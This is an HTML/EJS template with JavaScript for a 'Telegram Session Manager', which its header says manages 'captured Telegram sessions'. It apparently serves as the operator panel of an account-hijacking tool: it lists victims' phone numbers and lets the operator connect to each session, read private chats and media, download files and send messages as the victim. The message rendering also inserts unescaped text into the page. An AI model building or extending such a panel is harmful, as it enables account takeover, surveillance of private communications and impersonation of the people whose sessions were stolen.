<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Session Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: #0088cc; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .sessions { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .session-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .session-card h3 { color: #0088cc; margin-bottom: 10px; }
        .btn { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #006699; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .chat-interface { display: none; background: white; border-radius: 10px; padding: 20px; margin-top: 20px; }
        .chat-list { max-height: 300px; overflow-y: auto; border: 1px solid #ddd; border-radius: 5px; margin: 10px 0; }
        .chat-item { padding: 10px; border-bottom: 1px solid #eee; cursor: pointer; }
        .chat-item:hover { background: #f0f0f0; }
        .messages { max-height: 400px; overflow-y: auto; border: 1px solid #ddd; border-radius: 5px; padding: 10px; margin: 10px 0; }
        .message { margin-bottom: 10px; padding: 8px; background: #f9f9f9; border-radius: 5px; }
        .message-media { margin-top: 8px; }
        .message-media img { max-width: 300px; max-height: 200px; border-radius: 5px; cursor: pointer; }
        .message-media video { max-width: 300px; max-height: 200px; border-radius: 5px; }
        .message-media audio { width: 100%; max-width: 300px; }
        .file-info { background: #e9ecef; padding: 8px; border-radius: 5px; border-left: 3px solid #0088cc; }
        .file-info .file-name { font-weight: bold; color: #0088cc; }
        .file-info .file-size { font-size: 0.9em; color: #666; }
        .webpage-preview { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px; padding: 10px; margin-top: 5px; }
        .webpage-preview .title { font-weight: bold; color: #0088cc; margin-bottom: 5px; }
        .webpage-preview .description { color: #666; font-size: 0.9em; }
        .media-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
        .media-modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 90%; max-height: 90%; }
        .media-modal img, .media-modal video { max-width: 100%; max-height: 100%; }
        .close-modal { position: absolute; top: 15px; right: 35px; color: #f1f1f1; font-size: 40px; font-weight: bold; cursor: pointer; }
        .send-area { display: flex; gap: 10px; margin-top: 10px; }
        .send-area input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
        .status { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Telegram Session Manager</h1>
            <p>Manage captured Telegram sessions through web interface</p>
        </div>

        <div class="sessions">
            <% sessions.forEach((session, index) => { %>
            <div class="session-card">
                <h3>üì± <%= session.phone %></h3>
                <p><strong>Chat ID:</strong> <%= session.chatId %></p>
                <button class="btn" onclick="connectSession(<%= index %>)">Connect</button>
                <div id="status-<%= index %>" class="status" style="display: none;"></div>
            </div>
            <% }); %>
        </div>

        <div id="chat-interface" class="chat-interface">
            <h2>üí¨ Chat Interface</h2>
            <div id="account-info"></div>
            
            <h3>Recent Chats</h3>
            <div id="chat-list" class="chat-list"></div>
            
            <h3>Messages</h3>
            <div id="messages" class="messages"></div>
            
            <div class="send-area">
                <input type="text" id="message-input" placeholder="Type your message...">
                <button class="btn" onclick="sendMessage()">Send</button>
            </div>
            
            <button class="btn" onclick="disconnect()" style="background: #dc3545;">Disconnect</button>
        </div>

        <!-- Media Modal -->
        <div id="media-modal" class="media-modal" onclick="closeModal()">
            <span class="close-modal" onclick="closeModal()">&times;</span>
            <div class="media-modal-content" onclick="event.stopPropagation()">
                <div id="modal-media-content"></div>
            </div>
        </div>
    </div>

    <script>
        let currentSessionId = null;
        let currentChatId = null;

        async function connectSession(sessionIndex) {
            const statusDiv = document.getElementById(`status-${sessionIndex}`);
            statusDiv.style.display = 'block';
            statusDiv.className = 'status';
            statusDiv.textContent = 'Connecting...';

            try {
                const response = await fetch(`/connect/${sessionIndex}`, { method: 'POST' });
                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.sessionId;
                    statusDiv.className = 'status success';
                    statusDiv.textContent = 'Connected successfully!';
                    
                    document.getElementById('account-info').innerHTML = `
                        <div class="status success">
                            <strong>Connected as:</strong> ${data.accountInfo.firstName} ${data.accountInfo.lastName || ''} 
                            (${data.accountInfo.phone})
                        </div>
                    `;
                    
                    document.getElementById('chat-interface').style.display = 'block';
                    loadChats();
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.textContent = `Error: ${data.error}`;
                }
            } catch (error) {
                statusDiv.className = 'status error';
                statusDiv.textContent = `Connection failed: ${error.message}`;
            }
        }

        async function loadChats() {
            if (!currentSessionId) return;

            try {
                const response = await fetch(`/chats/${currentSessionId}`);
                const data = await response.json();

                if (data.success) {
                    const chatList = document.getElementById('chat-list');
                    chatList.innerHTML = data.chats.map(chat => `
                        <div class="chat-item" onclick="selectChat('${chat.id}', '${chat.title}')">
                            <strong>${chat.title}</strong>
                            <br><small>ID: ${chat.id}</small>
                        </div>
                    `).join('');
                }
            } catch (error) {
                console.error('Failed to load chats:', error);
            }
        }

        async function selectChat(chatId, chatTitle) {
            currentChatId = chatId;
            document.querySelector('h3').textContent = `Messages - ${chatTitle}`;
            
            try {
                const response = await fetch(`/messages/${currentSessionId}/${chatId}`);
                const data = await response.json();

                if (data.success) {
                    const messagesDiv = document.getElementById('messages');
                    messagesDiv.innerHTML = data.messages.map(msg => {
                        let mediaHtml = '';
                        
                        if (msg.media && msg.mediaType) {
                            const mediaUrl = `/media/${currentSessionId}/${chatId}/${msg.id}`;
                            
                            switch (msg.mediaType) {
                                case 'photo':
                                case 'image':
                                    mediaHtml = `
                                        <div class="message-media">
                                            <img src="${mediaUrl}" alt="Image" onclick="openModal('${mediaUrl}', 'image')" loading="lazy">
                                        </div>
                                    `;
                                    break;
                                    
                                case 'video':
                                    mediaHtml = `
                                        <div class="message-media">
                                            <video controls onclick="openModal('${mediaUrl}', 'video')">
                                                <source src="${mediaUrl}" type="video/mp4">
                                                Your browser does not support the video tag.
                                            </video>
                                        </div>
                                    `;
                                    break;
                                    
                                case 'audio':
                                    mediaHtml = `
                                        <div class="message-media">
                                            <audio controls>
                                                <source src="${mediaUrl}" type="audio/mpeg">
                                                Your browser does not support the audio tag.
                                            </audio>
                                        </div>
                                    `;
                                    break;
                                    
                                case 'document':
                                    const fileName = msg.media.fileName || 'Unknown file';
                                    const fileSize = msg.media.size ? formatFileSize(msg.media.size) : '';
                                    mediaHtml = `
                                        <div class="message-media">
                                            <div class="file-info">
                                                <div class="file-name">üìÑ ${fileName}</div>
                                                <div class="file-size">${fileSize}</div>
                                                <a href="${mediaUrl}" download="${fileName}" class="btn" style="margin-top: 5px; padding: 5px 10px; font-size: 0.9em;">Download</a>
                                            </div>
                                        </div>
                                    `;
                                    break;
                                    
                                case 'webpage':
                                    mediaHtml = `
                                        <div class="message-media">
                                            <div class="webpage-preview">
                                                <div class="title">${msg.media.title || 'Web Page'}</div>
                                                <div class="description">${msg.media.description || ''}</div>
                                                <a href="${msg.media.url}" target="_blank" class="btn" style="margin-top: 5px; padding: 5px 10px; font-size: 0.9em;">Open Link</a>
                                            </div>
                                        </div>
                                    `;
                                    break;
                            }
                        }
                        
                        return `
                            <div class="message">
                                <small>${new Date(msg.date * 1000).toLocaleString()}</small>
                                ${msg.text ? `<br>${msg.text}` : ''}
                                ${mediaHtml}
                            </div>
                        `;
                    }).join('');
                    messagesDiv.scrollTop = messagesDiv.scrollHeight;
                }
            } catch (error) {
                console.error('Failed to load messages:', error);
            }
        }

        async function sendMessage() {
            if (!currentSessionId || !currentChatId) {
                alert('Please select a chat first');
                return;
            }

            const messageInput = document.getElementById('message-input');
            const message = messageInput.value.trim();
            
            if (!message) return;

            try {
                const response = await fetch(`/send/${currentSessionId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chatId: currentChatId, message })
                });

                const data = await response.json();
                
                if (data.success) {
                    messageInput.value = '';
                    // Reload messages to show the sent message
                    selectChat(currentChatId, 'Current Chat');
                } else {
                    alert('Failed to send message');
                }
            } catch (error) {
                alert('Error sending message: ' + error.message);
            }
        }

        async function disconnect() {
            if (!currentSessionId) return;

            try {
                await fetch(`/disconnect/${currentSessionId}`, { method: 'POST' });
                currentSessionId = null;
                currentChatId = null;
                document.getElementById('chat-interface').style.display = 'none';
                
                // Reset status messages
                document.querySelectorAll('.status').forEach(el => el.style.display = 'none');
            } catch (error) {
                console.error('Disconnect error:', error);
            }
        }

        // Helper function to format file sizes
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Media modal functions
        function openModal(mediaUrl, mediaType) {
            const modal = document.getElementById('media-modal');
            const modalContent = document.getElementById('modal-media-content');
            
            if (mediaType === 'image') {
                modalContent.innerHTML = `<img src="${mediaUrl}" alt="Full size image">`;
            } else if (mediaType === 'video') {
                modalContent.innerHTML = `
                    <video controls autoplay>
                        <source src="${mediaUrl}" type="video/mp4">
                        Your browser does not support the video tag.
                    </video>
                `;
            }
            
            modal.style.display = 'block';
        }

        function closeModal() {
            const modal = document.getElementById('media-modal');
            const modalContent = document.getElementById('modal-media-content');
            modal.style.display = 'none';
            modalContent.innerHTML = ''; // Stop video playback
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeModal();
            }
        });

        // Allow Enter key to send messages
        document.getElementById('message-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
    </script>
</body>
</html>